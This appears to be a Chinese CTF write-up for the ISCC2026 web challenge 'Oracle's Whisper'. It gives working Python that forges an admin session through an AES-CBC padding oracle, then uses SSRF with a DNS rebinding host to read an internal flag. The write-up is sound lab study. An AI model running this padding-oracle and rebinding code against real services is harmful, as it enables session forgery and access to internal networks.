+++
title = "Oracle's Whisper"
date = "2026-05-15"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

=========================


Web - Oracle's Whisper

解题思路
--------

### 1. 信息收集

访问题目地址，看到一个简单的 HTML 页面：

&lt;h1&gt;// ORACLE'S WHISPER //&lt;/h1&gt;

&lt;p&gt;Speak to the oracle in her own tongue.&lt;/p&gt;

&lt;p&gt;API surfaces: &lt;code&gt;/graphql&lt;/code&gt;, &lt;code&gt;/login&lt;/code&gt;, &lt;code&gt;/api/profile&lt;/code&gt;&lt;/p&gt;

&lt;!-- TODO: review filter parsing before public release --&gt;

HTML 注释提示存在 "filter parsing" 问题，暗示可能存在过滤/解析漏洞。

尝试访问 /api/profile，返回 401 并提示缺少 session。尝试 POST /login 可以获取一个 session cookie。

对 session cookie 进行 base64 解码发现是乱码，初步判断为加密数据。进一步探索发现 /api/session/decrypt 端点，其行为非常特殊：

-   提交一个随机构造的 session token → 400 Bad Request

-   提交合法 session → 200 OK 并返回解密后的内容

结合从后续泄露的 session\_clue（或直接推测）——**"Sessions are AES-CBC with a server-fixed IV."**——可以确定这是一个经典的 **AES-CBC 填充预言机 (Padding Oracle)**。

### 2. Padding Oracle 原理解析

AES-CBC 解密过程：

Pi = D(Ci) XOR Ci-1

其中 D 是 AES 块解密，Ci 是密文块，Pi 是明文块。

CBC 填充预言机的核心在于：服务器用**不同的响应**来区分"填充有效"和"填充无效"。我们可以**逐字节**测试倒数第二个密文块（对最后一个明文块而言即为 Ci-1），通过修改 Ci-1 的某个字节来操纵解密后的填充值，直至服务器返回"填充有效"，即可解出中间值 D(Ci)，进而恢复明文。

具体求解公式：

D(C\_last) = 暴力枚举 C\_last-1 变体，找到使填充有效的值

P\_last = D(C\_last) XOR original\_C\_last-1

### 3. 利用 Padding Oracle 伪造 Admin Token

**目标**: 构造一个解密后为 {"user":"oracle","role":"admin"} 的 session token。

已知或推测的 session 结构为一个 JSON 对象，含 user 和 role 字段。我们需要构造三段明文：

P2 = {"user":"oracle" (16 bytes)

P3 = ,"role":"admin"} (16 bytes)

P4 = PKCS7 padding \\x10\*16

采用从后往前的构造方式（CBC 特性：修改 Ci-1 可以控制 Pi）：

1.  随机生成 C4（最后一个密文块）

2.  利用 oracle 解出 D(C4)

3.  计算 C3 = D(C4) XOR P4，使最后一块解密为全 \\x10 padding

4.  利用 oracle 解出 D(C3)

5.  计算 C2 = D(C3) XOR P3

6.  利用 oracle 解出 D(C2)

7.  计算 C1 = D(C2) XOR P2

最终 token = base64url(C1 + C2 + C3 + C4)

def oracle(blob: bytes) -&gt; bool:

"""返回 True 表示填充有效，False 表示填充无效"""

token = b64u\_enc(blob)

r = requests.post(f"{BASE}/api/session/decrypt", json={"token": token})

return r.status\_code != 400

def discover\_D(C: bytes) -&gt; bytes:

"""通过 padding oracle 解出中间值 D(C)"""

D = bytearray(BS)

for pad in range(1, BS + 1):

idx = BS - pad

for guess in range(256):

forged = bytearray(BS)

for j in range(idx + 1, BS):

forged\[j\] = D\[j\] \^ pad

forged\[idx\] = guess

if oracle(bytes(forged) + C):

\# 消除误报：pad=1 时需要二次验证

if pad == 1 and idx &gt; 0:

test = bytearray(forged)

test\[idx - 1\] \^= 1

if not oracle(bytes(test) + C):

continue

D\[idx\] = guess \^ pad

break

return bytes(D)

\# 从后往前构造

P2 = b'{"user":"oracle"'

P3 = b',"role":"admin"}'

P4 = bytes(\[16\]) \* 16

C4 = os.urandom(BS)

D4 = discover\_D(C4)

C3 = bytes(D4\[i\] \^ P4\[i\] for i in range(BS))

D3 = discover\_D(C3)

C2 = bytes(D3\[i\] \^ P3\[i\] for i in range(BS))

D2 = discover\_D(C2)

C1 = bytes(D2\[i\] \^ P2\[i\] for i in range(BS))

admin\_token = b64u\_enc(C1 + C2 + C3 + C4)

运行后获得 admin token，携带该 token 访问 /api/profile：

{

"email": "oracle@oracle.local",

"internal\_endpoint": "http://internal-api:6000/cache/template",

"internal\_token": "0ce471fa7d5f430dcfd6318ce20e3558",

"role": "admin",

"session\_clue": "Sessions are AES-CBC with a server-fixed IV.",

"uid": "oracle"

}

### 4. SSRF + DNS Rebinding 读取 Flag

从 profile 信息可知：

-   内网存在一个 API http://internal-api:6000/cache/template

-   需要一个 X-Internal-Token 头进行鉴权

-   题目提供了 /api/webhook/test 端点，可以让服务器发起 HTTP 请求（SSRF）

但直接请求内网地址会被限制，需要绕过。使用 DNS Rebinding 技术：

http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag

7f000001.01010101.rbndr.us 是 rbndr.us 提供的 DNS Rebinding 服务——域名解析会在 127.0.0.1 和 1.1.1.1 之间随机切换，从而绕过 SSRF 的地址检查。

target\_url = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"

for attempt in range(1, 25):

r = requests.post(

f"{BASE}/api/webhook/test",

json={

"url": target\_url,

"method": "GET",

"headers": {"X-Internal-Token": internal\_token},

},

cookies={"session": admin\_token},

)

if r.status\_code == 200 and "ISCC{" in r.text:

flag = json.loads(r.json()\["body"\])\["content"\]

print("FLAG:", flag)

break

多次尝试后（DNS 需轮转到 127.0.0.1），获得 flag。

Flag
----

ISCC{PnHCWSSKcJBm5M6ssZXV}
